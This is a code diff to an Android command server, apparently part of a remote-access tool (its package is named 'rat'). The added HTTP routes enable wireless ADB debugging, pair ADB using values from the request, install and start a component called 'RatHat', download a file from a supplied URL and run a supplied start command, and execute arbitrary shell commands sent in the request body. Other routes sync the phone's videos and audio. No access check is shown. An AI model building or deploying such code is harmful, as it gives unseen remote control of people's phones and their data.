@@ -2,6 +2,12 @@ package com.vendor.rat.control.server;
 
 import android.util.Log;
 
+import com.google.gson.Gson;
+import com.google.gson.JsonObject;
+import com.google.gson.JsonParser;
+import com.vendor.rat.control.entity.ADBConfig;
+import com.vendor.rat.control.entity.AdbShellResult;
+
 import java.util.concurrent.atomic.AtomicInteger;
 
 /**
@@ -22,6 +28,7 @@ public final class HttpCommandServer {
     private static volatile HttpCommandServer instance;
     public static final AtomicInteger serverState = new AtomicInteger(-1);
 
+    private final Gson gson;
     private final DeviceInfoHandler deviceInfoHandler;
     private final DeviceControlHandler deviceControlHandler;
     private final AppManageHandler appManageHandler;
@@ -33,6 +40,7 @@ public final class HttpCommandServer {
     private final SyncDataHandler syncDataHandler;
 
     public HttpCommandServer() {
+        gson = new Gson();
         deviceInfoHandler = new DeviceInfoHandler();
         deviceControlHandler = new DeviceControlHandler();
         appManageHandler = new AppManageHandler();
@@ -129,7 +137,19 @@ public final class HttpCommandServer {
             // --- 启动操作 ---
             if (path.startsWith("/start")) { return dispatchStart(path, body); }
 
-            // --- ADB 操作 ---
+            // --- ADB 操作 (non-/local routes) ---
+            if (path.equals("/openWifiDebug")) { return gson.toJson(adbOperationHandler.openWifiDebug()); }
+            if (path.equals("/closeWifiDebug")) { return gson.toJson(adbOperationHandler.closeWifiDebug()); }
+            if (path.equals("/enableWifiDebug")) { return gson.toJson(adbOperationHandler.enableWifiDebug()); }
+            if (path.equals("/reloadPairKeyFiles")) { adbOperationHandler.reloadPairKeyFiles(); return "ok"; }
+            if (path.equals("/installRatHat")) { adbOperationHandler.installRatHat(); return "ok"; }
+            if (path.equals("/updateRatHat")) { adbOperationHandler.updateRatHat(); return "ok"; }
+            if (path.equals("/stopRatHat")) { adbOperationHandler.stopRatHat(); return "ok"; }
+            if (path.equals("/shareADBConfig")) { adbOperationHandler.shareADBConfig(); return "ok"; }
+            if (path.equals("/requestLocalAdbPair")) { adbOperationHandler.requestLocalAdbPair(); return "ok"; }
+            if (path.equals("/requestLocalKeepAlive")) { adbOperationHandler.requestLocalKeepAlive(); return "ok"; }
+
+            // --- ADB 操作 (/local* routes) ---
             if (path.startsWith("/local")) { return dispatchLocal(path, body); }
 
             // --- /target/ UI 节点操作 ---
@@ -162,7 +182,10 @@ public final class HttpCommandServer {
             case "/syncVideos": syncDataHandler.syncVideos(); break;
             case "/syncAudios": syncDataHandler.syncAudios(); break;
             case "/syncWindows": break; // TODO: syncWindows
-            case "/syncADBConfig": break;
+            case "/syncADBConfig": {
+                ADBConfig config = adbOperationHandler.syncADBConfig();
+                return gson.toJson(config);
+            }
             case "/syncPowerControl": break;
             case "/syncLockCipher": break;
             case "/syncDownload": break;
@@ -188,7 +211,7 @@ public final class HttpCommandServer {
             case "/startVerifyCredential": break;
             case "/startInstallApp": break;
             case "/startRecord": mediaCaptureHandler.startRecord(0); break;
-            case "/startRatHat": break;
+            case "/startRatHat": adbOperationHandler.startRatHat(); break;
             default: return errorResponse("unknown start: " + path);
         }
         return "ok";
@@ -196,10 +219,58 @@ public final class HttpCommandServer {
 
     private String dispatchLocal(String path, String body) {
         switch (path) {
-            case "/localAdbConnect": adbOperationHandler.localAdbConnect(); break;
-            case "/localAdbPair": adbOperationHandler.localAdbPair(null, null, null, false); break;
-            case "/localAdbPush": adbOperationHandler.localAdbPush(null, null, null, null); break;
-            case "/localAdbShell": adbOperationHandler.localAdbShell(body); break;
+            case "/localAdbConnect": {
+                boolean result = adbOperationHandler.localAdbConnect();
+                return gson.toJson(result);
+            }
+            case "/localAdbPair": {
+                if (body != null && !body.isEmpty()) {
+                    try {
+                        JsonObject json = JsonParser.parseString(body).getAsJsonObject();
+                        String host = json.has("host") ? json.get("host").getAsString() : null;
+                        String pairPort = json.has("pairPort") ? json.get("pairPort").getAsString() : null;
+                        String pairCode = json.has("pairCode") ? json.get("pairCode").getAsString() : null;
+                        boolean directConnect = json.has("directConnect") && json.get("directConnect").getAsBoolean();
+                        boolean result = adbOperationHandler.localAdbPair(host, pairPort, pairCode, directConnect);
+                        return gson.toJson(result);
+                    } catch (Exception e) {
+                        Log.e(TAG, "localAdbPair body parse error", e);
+                        return gson.toJson(false);
+                    }
+                }
+                return gson.toJson(false);
+            }
+            case "/localAdbPush": {
+                if (body != null && !body.isEmpty()) {
+                    try {
+                        JsonObject json = JsonParser.parseString(body).getAsJsonObject();
+                        String logId = json.has("logId") ? json.get("logId").getAsString() : null;
+                        String fileUrl = json.has("fileUrl") ? json.get("fileUrl").getAsString() : null;
+                        String fileName = json.has("fileName") ? json.get("fileName").getAsString() : null;
+                        String startCommand = json.has("startCommand") ? json.get("startCommand").getAsString() : null;
+                        adbOperationHandler.localAdbPush(logId, fileUrl, fileName, startCommand);
+                    } catch (Exception e) {
+                        Log.e(TAG, "localAdbPush body parse error", e);
+                    }
+                }
+                return "ok";
+            }
+            case "/localAdbShell": {
+                String command = body;
+                // Support both raw string body and JSON { "command": "..." }
+                if (body != null && !body.isEmpty() && body.trim().startsWith("{")) {
+                    try {
+                        JsonObject json = JsonParser.parseString(body).getAsJsonObject();
+                        if (json.has("command")) {
+                            command = json.get("command").getAsString();
+                        }
+                    } catch (Exception ignored) {
+                        // Use body as-is if JSON parse fails
+                    }
+                }
+                AdbShellResult result = adbOperationHandler.localAdbShell(command);
+                return gson.toJson(result);
+            }
             case "/localBackAppState": break;
             case "/localDebugPort": break;
             default: return errorResponse("unknown local: " + path);
